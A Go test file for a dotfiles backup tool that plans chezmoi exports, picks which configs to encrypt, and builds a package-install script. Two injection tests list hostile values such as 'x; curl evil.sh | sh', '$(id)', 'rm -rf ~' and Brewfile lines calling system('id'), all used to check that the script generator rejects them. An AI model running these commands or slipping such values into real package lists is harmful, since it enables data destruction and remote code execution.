package chezmoi

import (
	"reflect"
	"runtime"
	"strings"
	"testing"

	"github.com/doguyilmaz/dothaven/internal/registry"
	"github.com/doguyilmaz/dothaven/internal/scan"
	"github.com/doguyilmaz/dothaven/internal/snapshot"
)

func TestIsSelected(t *testing.T) {
	if !IsSelected("shell", nil, nil) {
		t.Error("empty filters → selected")
	}
	if IsSelected("shell", nil, []string{"shell"}) {
		t.Error("skip should win")
	}
	if IsSelected("npm", []string{"shell"}, nil) {
		t.Error("only-list should exclude non-members")
	}
	if !IsSelected("shell", []string{"shell"}, nil) {
		t.Error("only-list member should be selected")
	}
}

func TestPlanExportEncryptDecision(t *testing.T) {
	entries := []registry.Entry{
		{ID: "shell.zshrc", Category: "shell", Kind: registry.File, Sensitivity: registry.Low, Paths: platPath("/h/.zshrc")},
		{ID: "cloud.kube", Category: "cloud", Kind: registry.File, Sensitivity: registry.High, Paths: platPath("/h/.kube/config")},
		{ID: "ssh.config", Category: "ssh", Kind: registry.File, Sensitivity: registry.Medium, Redact: scan.RedactSSHConfig, Paths: platPath("/h/.ssh/config")},
		{ID: "git.config", Category: "git", Kind: registry.File, Sensitivity: registry.Low, Paths: platPath("/h/.gitconfig")},
		{ID: "absent", Category: "x", Kind: registry.File, Paths: platPath("/h/none")},
	}
	exists := func(p string) bool { return p != "/h/none" }
	// gitconfig hides a real secret; everything else is clean.
	secret := func(p string) bool { return p == "/h/.gitconfig" }
	home := func(p string) bool { return false }

	plan := PlanExport(entries, "/h", Probes{Exists: exists, SecretInFile: secret, HasHomePath: home})
	got := map[string]PlanItem{}
	for _, p := range plan {
		got[p.ID] = p
	}

	if len(plan) != 4 {
		t.Fatalf("plan length = %d, want 4 (absent dropped)", len(plan))
	}
	if got["shell.zshrc"].Encrypt {
		t.Error("low-sensitivity clean config should be plain")
	}
	if !got["cloud.kube"].Encrypt || got["cloud.kube"].Reason != "sensitivity:high" {
		t.Errorf("high sensitivity → encrypt: %+v", got["cloud.kube"])
	}
	if !got["ssh.config"].Encrypt || got["ssh.config"].Reason != "has redact rule" {
		t.Errorf("redact rule → encrypt: %+v", got["ssh.config"])
	}
	if !got["git.config"].Encrypt || got["git.config"].Reason != "secret detected" {
		t.Errorf("probe-detected secret → encrypt: %+v", got["git.config"])
	}
}

func TestFindSshPrivateKeys(t *testing.T) {
	listDir := func(p string) ([]string, error) {
		return []string{"id_ed25519", "id_ed25519.pub", "config", "id_rsa"}, nil
	}
	isKey := func(p string) bool { return strings.HasSuffix(p, "id_ed25519") || strings.HasSuffix(p, "id_rsa") }
	got := FindSshPrivateKeys("/h", listDir, isKey)
	want := []string{"/h/.ssh/id_ed25519", "/h/.ssh/id_rsa"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("FindSshPrivateKeys = %v, want %v", got, want)
	}
}

func TestGnupgHasSecretKeys(t *testing.T) {
	withKey := func(p string) ([]string, error) { return []string{"ABCD.key", "README"}, nil }
	noKey := func(p string) ([]string, error) { return []string{"README"}, nil }
	if !GnupgHasSecretKeys("/h", withKey) {
		t.Error("a *.key should count as secret keys")
	}
	if GnupgHasSecretKeys("/h", noKey) {
		t.Error("no *.key → no secret keys")
	}
}

func TestMergeChezmoiignore(t *testing.T) {
	out := MergeChezmoiignore("", GnupgIgnorePatterns())
	for _, p := range GnupgIgnorePatterns() {
		if !strings.Contains(out, p) {
			t.Errorf("merged ignore missing %q", p)
		}
	}
	// Idempotent: merging again adds nothing.
	if again := MergeChezmoiignore(out, GnupgIgnorePatterns()); again != out {
		t.Errorf("merge not idempotent:\n%q\nvs\n%q", out, again)
	}
	// Preserves existing content.
	existing := "*.tmp\n"
	merged := MergeChezmoiignore(existing, []string{".gnupg/S.*"})
	if !strings.Contains(merged, "*.tmp") || !strings.Contains(merged, ".gnupg/S.*") {
		t.Errorf("merge dropped existing content: %q", merged)
	}
}

func TestFilterBrewfile(t *testing.T) {
	bf := "tap \"x/y\"\nbrew \"ripgrep\"\nvscode \"ms.python\"\ncask \"firefox\"\n"
	got := FilterBrewfile(bf, []string{"vscode"})
	if strings.Contains(got, "vscode") {
		t.Errorf("vscode line not stripped: %q", got)
	}
	if !strings.Contains(got, "ripgrep") || !strings.Contains(got, "firefox") {
		t.Errorf("non-skipped lines dropped: %q", got)
	}
	if FilterBrewfile(bf, nil) != bf {
		t.Error("empty skip should return input unchanged")
	}
}

func TestPickInstallSpec(t *testing.T) {
	it := snapshot.Item{Raw: "typescript@5.4.0", Columns: []string{"typescript", "5.4.0"}}
	if got := PickInstallSpec(it, false); got != "typescript" {
		t.Errorf("unpinned = %q, want bare name", got)
	}
	if got := PickInstallSpec(it, true); got != "typescript@5.4.0" {
		t.Errorf("pinned = %q, want name@version", got)
	}
	bare := snapshot.Item{Raw: "deno-bin"}
	if got := PickInstallSpec(bare, false); got != "deno-bin" {
		t.Errorf("no columns falls back to raw, got %q", got)
	}
}

func TestCrossManagerDuplicates(t *testing.T) {
	m := Manifest{
		BunGlobals:  []string{"argent", "typescript"},
		NpmGlobals:  []string{"argent", "eslint"},
		PnpmGlobals: []string{"prettier"},
	}
	if got := CrossManagerDuplicates(m); !reflect.DeepEqual(got, []string{"argent"}) {
		t.Errorf("duplicates = %v, want [argent]", got)
	}
}

func TestSettingsSyncConflicts(t *testing.T) {
	plan := []PlanItem{
		{ID: "editor.vscode.settings", Src: "/u/Library/Application Support/Code/User/settings.json"},
		{ID: "editor.cursor", Src: "/u/Library/Application Support/Cursor/User/settings.json"},
		{ID: "shell.zshrc", Src: "/u/.zshrc"},
	}
	// Only VS Code's sync state dir exists.
	exists := func(p string) bool { return strings.HasSuffix(p, "Code/User/sync") }
	got := SettingsSyncConflicts(plan, exists)
	if len(got) != 1 || got[0] != "/u/Library/Application Support/Code/User/settings.json" {
		t.Errorf("expected only the VS Code settings flagged, got %v", got)
	}
	// No sync dirs → no conflicts.
	if c := SettingsSyncConflicts(plan, func(string) bool { return false }); len(c) != 0 {
		t.Errorf("expected no conflicts, got %v", c)
	}
}

func TestBuildPackageInstallScript(t *testing.T) {
	if _, ok := BuildPackageInstallScript(Manifest{}); ok {
		t.Error("empty manifest should produce no script")
	}
	// deno-only is not installable → no script (deno can't be reconstructed).
	if _, ok := BuildPackageInstallScript(Manifest{DenoBins: []string{"x"}}); ok {
		t.Error("deno-only manifest should produce no script")
	}

	script, ok := BuildPackageInstallScript(Manifest{
		Brewfile:         "brew \"ripgrep\"",
		NodeVersions:     []string{"v20.0.0", "system"},
		BunGlobals:       []string{"argent"},
		CargoCrates:      []string{"ripgrep"},
		DenoBins:         []string{"deployctl"},
		PipxPackages:     []string{"poetry"},
		CursorExtensions: []string{"anthropic.claude-code"},
		RustToolchains:   []string{"stable"},
		UvTools:          []string{"ruff"},
		ComposerGlobals:  []string{"laravel/installer"},
		PubGlobals:       []string{"melos"},
		DotnetTools:      []string{"dotnetsay"},
		AptPackages:      []string{"ripgrep"},
		SnapPackages:     []string{"code"},
		FlatpakPackages:  []string{"org.gimp.GIMP"},
	})
	if !ok {
		t.Fatal("expected a script")
	}
	for _, want := range []string{
		"#!/bin/bash", "set -uo pipefail",
		"command -v brew", "brew bundle --file=-", "BREWFILE",
		"command -v fnm", "fnm install 'v20.0.0' || true",
		"command -v bun", "bun add -g 'argent' || true",
		"command -v cargo", "cargo install 'ripgrep' || true",
		"command -v pipx", "pipx install 'poetry' || true",
		"command -v rustup", "rustup toolchain install 'stable' || true",
		"command -v cursor", "cursor --install-extension 'anthropic.claude-code' || true",
		"command -v uv", "uv tool install 'ruff' || true",
		"command -v composer", "composer global require 'laravel/installer' || true",
		"command -v dart", "dart pub global activate 'melos' || true",
		"command -v dotnet", "dotnet tool install --global 'dotnetsay' || true",
		"command -v apt-get", "sudo apt-get install -y 'ripgrep' || true",
		"command -v snap", "sudo snap install 'code' || true",
		"command -v flatpak", "flatpak install -y flathub 'org.gimp.GIMP' || true",
		"# deno global bins", "#   deployctl",
		"exit 0",
	} {
		if !strings.Contains(script, want) {
			t.Errorf("script missing %q\n---\n%s", want, script)
		}
	}
	if strings.Contains(script, "fnm install system") {
		t.Error("`system` node version must be filtered out")
	}
	// pipx/rustup/cursor inventory alone (no brew/node) still yields a script.
	if _, ok := BuildPackageInstallScript(Manifest{PipxPackages: []string{"poetry"}}); !ok {
		t.Error("pipx-only manifest should produce a script")
	}
}

// platPath builds a single-platform Paths map for the running OS so ResolvePath
// resolves in tests regardless of GOOS.
func platPath(p string) map[string]string {
	return map[string]string{runtime.GOOS: p}
}

func TestPlanTemplatesOnlyWhenHomeIsNamed(t *testing.T) {
	entries := []registry.Entry{
		{ID: "shell.zshrc", Category: "shell", Kind: registry.File, Paths: platPath("/h/.zshrc")},
		{ID: "terminal.wezterm", Category: "terminal", Kind: registry.File, Paths: platPath("/h/.wezterm.lua")},
	}
	plan := PlanExport(entries, "/h", Probes{
		Exists:       func(string) bool { return true },
		SecretInFile: func(string) bool { return false },
		HasHomePath:  func(p string) bool { return p == "/h/.zshrc" },
	})
	if !plan[0].Template || plan[1].Template {
		t.Errorf("template decision: %+v", plan)
	}
}

func TestPlanFilesEncryptsPerFile(t *testing.T) {
	item := PlanItem{ID: "editor.nvim", Kind: "dir", Src: "/h/.config/nvim"}
	files := PlanFiles(item, []string{"/h/.config/nvim/init.lua", "/h/.config/nvim/secrets.lua"}, func(p string) bool { return strings.HasSuffix(p, "secrets.lua") })
	if files[0].Encrypt || !files[1].Encrypt {
		t.Errorf("per-file encryption: %+v", files)
	}
	high := PlanFiles(PlanItem{Kind: "dir", Encrypt: true}, []string{"/a"}, func(string) bool { return false })
	if !high[0].Encrypt {
		t.Error("a high-sensitivity dir encrypts every file")
	}
}

// Names come from a backup's inventory, which a readable GitHub copy lets
// anyone with write access edit. Nothing a shell or Ruby reads as code gets
// into the install script.
func TestInstallScriptRefusesInjectedNames(t *testing.T) {
	script, _ := BuildPackageInstallScript(Manifest{
		NpmGlobals:   []string{"typescript", "@scope/pkg@1.2.3", "x; curl evil.sh | sh", "$(id)", "`id`", "a'b"},
		CargoCrates:  []string{"ripgrep", "rg && rm -rf ~"},
		NodeVersions: []string{"v20.11.0", "lts/iron", "v1\nrm -rf ~"},
		DenoBins:     []string{"deployctl", "x\nrm -rf ~"},
		Brewfile: strings.Join([]string{
			`tap "homebrew/cask-fonts"`,
			`brew "git"`,
			`brew "postgresql@16", restart_service: :changed`,
			`brew "nginx-full", args: ["with-rtmp-module"]`,
			`mas "Final Cut Pro", id: 424389933`,
			`vscode "ms-python.python"`,
			`brew "x#{system('id')}"`,
			`system("id")`,
			`BREWFILE`,
			`rm -rf ~`,
		}, "\n"),
	})
	for _, bad := range []string{"curl evil", "$(id)", "`id`", "a'b", "rm -rf", "system(", "#{"} {
		if strings.Contains(script, bad) {
			t.Errorf("script contains %q:\n%s", bad, script)
		}
	}
	for _, good := range []string{"'typescript'", "'@scope/pkg@1.2.3'", "'ripgrep'", "'lts/iron'", "#   deployctl",
		`brew "postgresql@16", restart_service: :changed`, `brew "nginx-full", args: ["with-rtmp-module"]`,
		`mas "Final Cut Pro", id: 424389933`, `vscode "ms-python.python"`, `tap "homebrew/cask-fonts"`} {
		if !strings.Contains(script, good) {
			t.Errorf("script lost %q:\n%s", good, script)
		}
	}
	// The heredoc ends exactly once: a line "BREWFILE" in the data cannot end it early.
	if strings.Count(script, "\nBREWFILE") != 1 {
		t.Errorf("heredoc terminator appears more than once:\n%s", script)
	}
}

// What brew bundle dump writes passes; what runs a command, or reaches an
// interpolation, does not.
func TestSafeBrewLine(t *testing.T) {
	for _, l := range []string{
		`tap "homebrew/cask-fonts"`,
		`tap "me/tools", "https://github.com/me/homebrew-tools"`,
		`brew "postgresql@16", restart_service: :changed`,
		`brew "nginx-full", args: ["with-rtmp-module"], link: false`,
		`cask "firefox", args: { appdir: "~/Applications" }`,
		`cask "iterm2", greedy: true`,
		`mas "Final Cut Pro", id: 424389933`,
		`mas "C# Notes", id: 1234`,
		`brew 'single-quoted'`,
		`vscode "ms-python.python"`,
		`brew "git" # a comment`,
	} {
		if !SafeBrewLine(l) {
			t.Errorf("rejected a line brew bundle writes: %s", l)
		}
	}
	for _, l := range []string{
		`brew "x", postinstall: "curl evil | sh"`,
		`cask "x", postinstall: "${HOMEBREW_PREFIX}/bin/x --setup"`,
		`brew "x#{system('id')}"`,
		`brew "x#@evil"`,
		`brew "x#$evil"`,
		`tap "evil/tap", "file:///tmp/evil"`,
		`tap "evil/tap", "ssh://host/repo"`,
		`system("id")`,
		`brew "a", args: [system("id")]`,
		`BREWFILE`,
	} {
		if SafeBrewLine(l) {
			t.Errorf("accepted: %s", l)
		}
	}
}
